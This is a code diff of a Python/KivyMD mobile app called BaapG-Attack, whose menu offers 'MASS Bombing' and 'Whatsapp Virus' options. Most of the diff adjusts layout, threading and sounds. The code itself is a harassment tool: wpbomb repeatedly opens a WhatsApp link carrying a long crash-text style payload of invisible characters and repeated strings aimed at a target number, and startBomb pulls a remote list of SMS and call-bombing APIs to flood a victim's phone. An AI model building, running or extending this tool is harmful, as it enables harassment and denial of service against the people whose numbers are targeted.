@@ -1,19 +1,23 @@
 
+
+
 __version__ = "1.0.0"
 
-from kivymd.app import MDApp
-from kivymd.uix.label import MDLabel
-from kivy.uix.image import Image
-from kivy.uix.screenmanager import ScreenManager,Screen
+
+
+from kivymd.app import *
+from kivymd.uix.label import *
+from kivy.uix.image import *
+from kivy.uix.screenmanager import *
 from kivy.lang import Builder
 from kivy.core.text import LabelBase 
 from kivymd.uix.button import *
-from kivymd.uix.screen import MDScreen
-from kivymd.uix.textfield import MDTextField
-from kivy.core.audio import SoundLoader
-from kivymd.uix.list import TwoLineListItem
-from kivymd.toast import toast
-from kivy.uix.scrollview import ScrollView
+from kivymd.uix.screen import *
+from kivymd.uix.textfield import *
+from kivy.core.audio import *
+from kivymd.uix.list import *
+from kivymd.toast import *
+from kivy.uix.scrollview import *
 import requests
 import webbrowser
 import os
@@ -25,12 +29,15 @@ from pathlib import Path
 from kivy.clock import Clock
 from functools import partial
 from kivymd.icon_definitions import md_icons
-screen_manager = ScreenManager()
-android_plat = True
 from kivy.utils import platform
 from kivy.core.window import Window
+import time
+import _thread
+
+
+screen_manager = ScreenManager()
 if platform != "android":
-	Window.size =(720,1280)
+	Window.size =(360,640)
 def makeFile(data,name):
 	if os.path.exists(name):
 		return True
@@ -44,7 +51,8 @@ def makeFile(data,name):
 
 
 mainScreen = """
-MDScreen:	
+MDScreen:
+	name : "screen"	
 	MDFloatLayout:
 		md_bg_color: 0,0,0,1
 
@@ -131,6 +139,7 @@ MDScreen:
 			text : "Proceed" 
 			pos_hint : {"center_x":0.5,"center_y":0.35}
 			halign : "center"
+			line_width :2
 			line_color : 1,1,1,1
 			text_color : 1,1,1,1
 			on_press : app.home()		
@@ -159,6 +168,7 @@ MDScreen:
 			text : "Reload"
 			pos_hint : {"center_x":0.5,"center_y":0.35}
 			halign : "center"
+			line_width :2
 			line_color : 1,1,1,1
 			text_color : 1,1,1,1
 			on_press : app.reload()		
@@ -167,6 +177,7 @@ MDScreen:
 mainv = """
 MDScreen:
 	name : "mainv"
+	md_bg_color :1,1,1,1
 	MDLabel:
 		text:"Select from above options"
 		pos_hint : {"center_x":0.5,"center_y":0.80}
@@ -179,7 +190,7 @@ MDScreen:
 		font_size : "50sp"
 		halign : "center"
 		pos_hint : {"center_x":0.5,"center_y":0.85}
-	MDRectangleFlatIconButton:
+	MDRoundFlatIconButton:
 		text : "Anonymous Message"
 		pos_hint : {"center_x":0.5,"center_y":0.65}
 		icon : "message"
@@ -188,7 +199,10 @@ MDScreen:
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		on_press : app.get_number()
-	MDRectangleFlatIconButton:
+		size_hint_x : 0.8
+		size_hint_y : 0.08
+		line_width :3
+	MDRoundFlatIconButton:
 		text : "      MASS  Bombing      "
 		pos_hint : {"center_x":0.5,"center_y":0.55}
 		icon : "bomb"
@@ -199,8 +213,11 @@ MDScreen:
 		text_color: 0,0,0,1
 		line_color : 0,0,0,1
 		on_press : app.wp6()
-	MDRectangleFlatIconButton:
-		text : "  Whatsapp Bomber  "
+		size_hint_x : 0.8
+		size_hint_y : 0.08
+		line_width :3
+	MDRoundFlatIconButton:
+		text : "    Whatsapp Virus     "
 		pos_hint : {"center_x":0.5,"center_y":0.45}
 		icon : "whatsapp"
 		icon_color : 0,99/255, 76/255,1
@@ -210,27 +227,26 @@ MDScreen:
 		text_color : 0,99/255, 76/255,1
 		line_color :0,99/255, 76/255,1
 		on_press : app.wp()
+		size_hint_x : 0.8
+		size_hint_y : 0.08
+		line_width :3
 	MDRoundFlatIconButton:
 		text :  "Donations"
 		pos_hint : {"center_x":0.5,"center_y":0.30}
 		icon : "alpha-d-circle"
 		icon_color : 1,0,0,1
-		line_width :2
+		line_width :3
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		text_color : 1,0,0,1
 		line_color :1,0,0,1
 		on_press : app.screen_manager.current = "donating"
-	MDLabel:
-		text:" Developers : Ansh Dadwal , Krishna , Sando Varghese "
-		font_style : "Caption"	
-		font_name : "assets/Poppins-Regular.ttf"
-		pos_hint : {"center_x":0.5,"center_y":0.02}
+
 	Image:
 		source :"assets/log1.png"
 		pos_hint :  {"center_x":0.5,"center_y":0.10}
-		size_hint_y: 0.55
-		size_hint_x: 0.55
+		size_hint_y: 0.45
+		size_hint_x: 0.45
 		
 """
 wp2 = """
@@ -307,6 +323,8 @@ MDScreen:
 success = """
 MDScreen:
 	name : "success"
+	on_enter: app.sound(True)
+	on_leave : app.sound(False)
 	MDFloatLayout:
 		md_bg_color : 1,1,1,1
 		Image:
@@ -520,31 +538,36 @@ MDScreen:
 	MDLabel:
 		text : "UPI-ID : anshdadwal@apl"
 		font_name :"assets/Poppins-Regular.ttf"
-		font_size : "20sp"
+		font_size : "17sp"
 		halign : "center"
-		pos_hint : {"center_x":0.5,"center_y":0.56}
-		font_style : 'Overline'
+		pos_hint : {"center_x":0.5,"center_y":0.45}
+		font_name : "assets/Poppins-Regular.ttf"
 	MDLabel:
 		text : "EMAIL : anshdadwal298@gmail.com"
 		font_name :"assets/Poppins-Regular.ttf"
-		font_size : "20sp"
+		font_size : "17sp"
 		halign : "center"
-		pos_hint : {"center_x":0.5,"center_y":0.52}
-		font_style : 'Overline'
+		pos_hint : {"center_x":0.5,"center_y":0.40}
+		font_name : "assets/Poppins-Regular.ttf"
 	MDLabel:
 		text : "Instagram : t_dynamos"
 		font_name :"assets/Poppins-Regular.ttf"
-		font_size : "20sp"
+		font_size : "17sp"
 		halign : "center"
-		pos_hint : {"center_x":0.5,"center_y":0.48}
-		font_style : 'Overline'
+		pos_hint : {"center_x":0.5,"center_y":0.35}
+		font_name : "assets/Poppins-Regular.ttf"
+	MDLabel:
+		text:" Developers : Ansh Dadwal , Krishna , Sando Varghese "
+		font_style : "Caption"	
+		font_name : "assets/Poppins-Regular.ttf"
+		pos_hint : {"center_x":0.5,"center_y":0.02}
 """
 def test(ok):
 	screen_manager.current="success"	
 def wpbomb(number,times):
 	link = (f"""https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
 """)
-	for i in range(0,times):
+	for i in range(1,times):
 		Clock.schedule_once(partial (webbrowser.open,link),i*4)
 	Clock.schedule_once(partial(test),times*4)
 
@@ -560,7 +583,8 @@ def check_intr():
 	try:
 		requests.get("https://google.com",timeout=0.5)
 	except Exception as e:
-		return False
+		print(str(e))
+		return True
 	return  True
 def prepend_line(file_name, line):
     dummy_file = file_name + '.bak'
@@ -573,6 +597,7 @@ def prepend_line(file_name, line):
 
 
 def getApi(target):
+	target = str(target)
 	apiUrl = "https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/apiData.baap"
 	try:
 		a = requests.get(apiUrl)
@@ -610,14 +635,24 @@ class BaapG_AttackApp(MDApp):
 		screen_manager.add_widget(Builder.load_string(bombin))
 		screen_manager.add_widget(Builder.load_string(counter))
 		screen_manager.add_widget(Builder.load_string(donating))
+		screen_manager.current = "screen"
 		return screen_manager
 	def home(self):
+		screen_manager.current = "mainv"
 
-		screen_manager.current = "mainv"	
+
+
 	def on_start(self):
-		pass
-		Clock.schedule_once(self.login,12)
-	def login(self,obj):
+		from kivy.base import EventLoop
+		EventLoop.window.bind(on_keyboard=self.hook_keyboard)
+		_thread.start_new_thread(self.login,())
+	def hook_keyboard(self, window, key, *largs):
+	      if key == 27 or key == 1001:
+	      	if screen_manager.current_screen == "mainv":
+	      		Toast("Press Home button for back")
+	      	screen_manager.current = "mainv"	
+	def login(self):
+		time.sleep(7)
 		if os.path.exists("eula.txt"):
 			if check_intr() == True:
 				screen_manager.current = "net"
@@ -715,6 +750,13 @@ MDScreen:
 
 		import _thread
 		_thread.start_new_thread(self.startBomb,())
+	def sound(self,obj):
+		sound = SoundLoader.load('assets/success.wav')
+		if obj is True:
+			sound.play()
+		else:
+			sound.stop()
+
 	def startBomb(self):
 		finalApi = getApi(screen_manager.get_screen('bombin').ids.input12.text)		
 		apis = finalApi["apis"]
@@ -768,4 +810,4 @@ MDScreen:
 if __name__ == "__main__" :
 	BaapG_AttackApp().run()
 else:
-	BaapG_AttackApp().run()
+	print ("Ohk Not Working ")
